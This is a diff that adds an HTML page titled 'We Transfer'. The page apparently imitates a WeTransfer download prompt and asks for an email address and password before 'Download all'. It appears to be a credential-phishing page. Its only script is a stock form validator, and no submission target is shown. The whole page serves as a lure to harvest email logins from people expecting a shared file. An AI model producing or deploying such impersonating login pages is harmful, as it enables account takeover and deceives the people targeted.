@@ -1,0 +1,54 @@
+
+
+
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>We Transfer</title>
+
+<script type="text/javascript">
+function MM_validateForm() { //v4.0
+if (document.getElementById){
+var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
+for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=document.getElementById(args[i]);
+if (val) { nm=val.name; if ((val=val.value)!="") {
+if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
+if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
+} else if (test!='R') { num = parseFloat(val);
+if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
+if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
+min=test.substring(8,p); max=test.substring(p+1);
+if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
+} } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
+} if (errors) alert('The following error(s) occurred:\n'+errors);
+document.MM_returnValue = (errors == '');
+} }
+</script>
+<link rel="stylesheet" type="text/css" href="favicon.ico">
+</head>
+<body background="bkg.png" style="background-image: url('bkg.png'); background-repeat:no-repeat; background-attachment:fixed">
+<div style="position: absolute; width: 422px; height: 154px; z-index: 1; left: 46px; top: 287px" id="layer1">
+		<table id="form-1" cellpadding="5" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif; margin-top: 20px;" width="566">
+			<tbody style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">
+				<tr style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">
+					<td colspan="2" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;" height="115">
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+					<p><font size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input class="text-field" id="user" name="user" placeholder="Email address" type="text" style="font-family: Verdana, Geneva, sans-serif; width: 215; font-size: 16px; font-weight: normal; border-radius: 5px; height: 38; border: 1px solid rgb(204, 204, 204); padding: 8px"></td>
+				</tr>
+				<tr style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">
+					<td colspan="2" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;" height="82">
+					<font size="2">&nbsp;&nbsp;&nbsp;&nbsp;</font>&nbsp;<input class="text-field" id="pass" name="pass" placeholder="Password" type="password" style="font-family: Verdana, Geneva, sans-serif; width: 213; font-size: 16px; font-weight: normal; border-radius: 5px; height: 38; border: 1px solid rgb(204, 204, 204); padding: 8px"><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<input class="btn1" onClick="MM_validateForm('password','','R','mail','','RisEmail','phone','','NisNum');return document.MM_returnValue" name="log0" value="Download all" type="submit" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif; width: 132; padding: 10px; color: rgb(255, 255, 255); font-size: 15px; text-align: center; border-radius: 5px; border: 1px solid rgb(0, 157, 245); cursor: pointer; background-color: rgb(0, 157, 245); transition: background-color 0.9s ease; height:46"></td>
+				</tr>
+				<tr style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">
+					<td style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;" width="504" height="39">
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+					<td valign="top" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;" width="36" height="39">
+					&nbsp;</td>
+				</tr>
+				<tr style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">
+					<td colspan="2" style="font-family: Adobe-Clean, Geneva, Tahoma, Helvetica, Arial, sans-serif;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </td>
+				</tr>
+		</table>
+	</div>
+
+
+</body></html>
